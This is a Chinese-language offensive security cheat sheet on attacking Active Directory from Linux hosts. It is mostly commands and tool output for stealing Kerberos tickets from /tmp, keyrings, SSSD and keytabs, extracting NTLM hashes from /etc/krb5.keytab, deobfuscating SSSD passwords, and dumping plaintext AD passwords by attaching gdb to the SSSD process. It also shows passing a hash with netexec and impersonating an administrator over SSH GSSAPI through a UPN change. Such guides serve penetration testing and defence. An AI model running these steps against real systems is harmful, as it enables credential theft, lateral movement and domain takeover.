# Active Directory - Linux

## 从 /tmp 中重用 CCACHE 票据

> 当票据被设置为以文件形式存储在磁盘上时，标准格式和类型是 CCACHE 文件。这是一种简单的二进制文件格式，用于存储 Kerberos 凭据。这些文件通常存储在 /tmp 中，权限为 600。

使用 `env | grep KRB5CCNAME` 列出当前用于身份验证的票据。该格式是可移植的，可以通过设置环境变量 `export KRB5CCNAME=/tmp/ticket.ccache` 来重用票据。Kerberos 票据名称格式为 `krb5cc_%{uid}`，其中 uid 是用户的 UID。

```powershell
$ ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

$ export KRB5CCNAME=/tmp/krb5cc_1569901115
```

## 从 keyring 中重用 CCACHE 票据

从 Linux 内核密钥中提取 Kerberos 票据的工具：<https://github.com/TarlogicSecurity/tickey>

```powershell
# 配置和构建
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```

## 从 SSSD KCM 中重用 CCACHE 票据

系统安全服务守护进程（SSSD）在路径 `/var/lib/sss/secrets/secrets.ldb` 维护数据库副本。
相应的密钥存储在路径 `/var/lib/sss/secrets/.secrets.mkey` 的隐藏文件中。
默认情况下，该密钥仅 **root** 权限可读。

使用 `SSSDKCMExtractor` 的 --database 和 --key 参数来解析数据库并解密机密信息。

```powershell
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

凭据缓存 Kerberos blob 可以转换为可用的 Kerberos CCache 文件，传递给 Mimikatz/Rubeus。

## 从 keytab 中重用 CCACHE 票据

```powershell
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

## 从 /etc/krb5.keytab 中提取帐户

以 root 身份运行的服务使用的服务密钥通常存储在密钥表文件 /etc/krb5.keytab 中。此服务密钥相当于服务的密码，必须保持安全。

使用 [microsoft/klist](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/klist) 读取密钥表文件并解析其内容。当[密钥类型](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey)为 23 时，你看到的密钥就是用户的实际 NT Hash。

```powershell
$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
  KVNO: 25
  Key type: 23
  Key: 31d6cfe0d16ae931b73c59d7e0c089c0
  Time stamp: Oct 07,  2019 09:12:02
[...]
```

在 Linux 上可以使用 [sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract)：我们需要 RC4 HMAC 哈希来重用 NTLM 哈希。

```powershell
$ python3 keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # 运气不好
[+] Keytab File successfully imported.
        REALM : DOMAIN
        SERVICE PRINCIPAL : host/computer.domain
        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # 好运
```

在 macOS 上可以使用 [its-a-feature/bifrost](https://github.com/its-a-feature/bifrost)。

```powershell
./bifrost -action dump -source keytab -path test
```

使用帐户和哈希通过 CME 连接到机器。

```powershell
$ netexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
```

## 从 /etc/sssd/sssd.conf 中提取帐户

> sss_obfuscate 将给定密码转换为人类不可读的格式，并将其放入 SSSD 配置文件的相应域部分中，通常位于 /etc/sssd/sssd.conf

混淆后的密码放入给定 SSSD 域的 "ldap_default_authtok" 参数中，"ldap_default_authtok_type" 参数设置为 "obfuscated_password"。

```ini
[sssd]
config_file_version = 2
...
[domain/LDAP]
...
ldap_uri = ldap://127.0.0.1
ldap_search_base = ou=People,dc=srv,dc=world
ldap_default_authtok_type = obfuscated_password
ldap_default_authtok = [BASE64_ENCODED_TOKEN]
```

使用 [mludvig/sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate) 反混淆 ldap_default_authtok 变量的内容

```ps1
./sss_deobfuscate [ldap_default_authtok_base64_encoded]
./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
```

## 从 SSSD keyring 中提取帐户

**前提条件**：

* `/etc/sssd/sssd.conf` 中 `krb5_store_password_if_offline = True`

**利用方法**：

当 `krb5_store_password_if_offline` 启用时，AD 密码以明文存储。

```ps1
[domain/domain.local]
cache_credentials = True
ipa_domain = domain.local
id_provider = ipa
auth_provider = ipa
access_provider = ipa
chpass_provider = ipa
ipa_server = _srv_, server.domain.local
krb5_store_password_if_offline = true
```

获取 SSSD 进程的 PID 并在 `gdb` 中挂接。然后列出进程密钥环。

```ps1
gdb -p <PID_OF_SSSD>
call system("keyctl show > /tmp/output")
```

从 `/tmp/output` 中定位你想要的用户的 `key_id`。

```ps1
Session Keyring
 237034099 --alswrv      0     0  keyring: _ses
 689325199 --alswrv      0     0   \_ user: user@domain.local
```

回到 GDB：

```ps1
call system("keyctl print 689325199 > /tmp/output")
```

## SSH GSSAPI

GSSAPI（通用安全服务应用程序接口）是一个提供安全服务（如身份验证）的 API，充当 Kerberos 等不同安全机制的抽象层。

**前提条件**：

* 对 **Public-Information** 字段具有写入权限
* 支持 GSSAPI 身份验证的 SSH 服务器：[CCob/gssapi-abuse](https://github.com/CCob/gssapi-abuse)

    ```ps1
    ./gssapi-abuse.py -d grandline.local enum -u username -p 'P@ssw0rd'
    ```

**方法**：

由于 MIT Kerberos 不验证 PAC，控制一个域帐户并修改其 UPN 允许我们伪装成另一个用户。

* 修改 **Public-Information** 字段内的 `userPrincipalName`。

    ```ps1
    bloodyAD --host "dc1.domain.local" -d "domain.local" -u 'username' -p 'P@ssw0rd' set object username userPrincipalName -v 'administrator'  
    ```

* 使用 `NT_ENTERPRISE` 主体请求票据，因为它会在票据中先搜索 `userPrincipalName` 再搜索 `samAccountName`。

    ```ps1
    getTGT.py -dc-ip "10.10.10.10" "domain.local"/"username":'P@ssw0rd' -principalType NT_ENTERPRISE
    .\Rubeus.exe asktgt /user:Administrator /password:Password /principalType:enterprise
    ```

* 编辑 `/etc/krb5.conf` 以通过 GSSAPI 对 Linux 主机进行身份验证。

    ```yaml
    [libdefaults]
        default_realm = DOMAIN.LOCAL

    [realms]
        DOMAIN.LOCAL = {
                kdc = dc1.domain.local
        }

    [domain_realm]
        .domain.local = DOMAIN.LOCAL
        domain.local = DOMAIN.LOCAL
    ```

* SSH 连接

    ```ps1
    export KRB5CCNAME=username.ccache
    ssh -vv -K username@domain.local@linux.domain.local
    ```

## 参考资料

* [20.4. Caching Kerberos Passwords - Red Hat Customer Portal](https://access.redhat.com/documentation/fr-fr/red_hat_enterprise_linux/6/html/identity_management_guide/kerberos-pwd-cache)
* [A broken marriage. Abusing mixed vendor Kerberos stacks - Ceri Coburn - August 25, 2023](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/?ref=rayanle.cat)
* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
* [Hack'in 2025 - One Directory - rayanlecat - June 25, 2025](https://www.rayanle.cat/hackin-2025-one-directory/)
* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
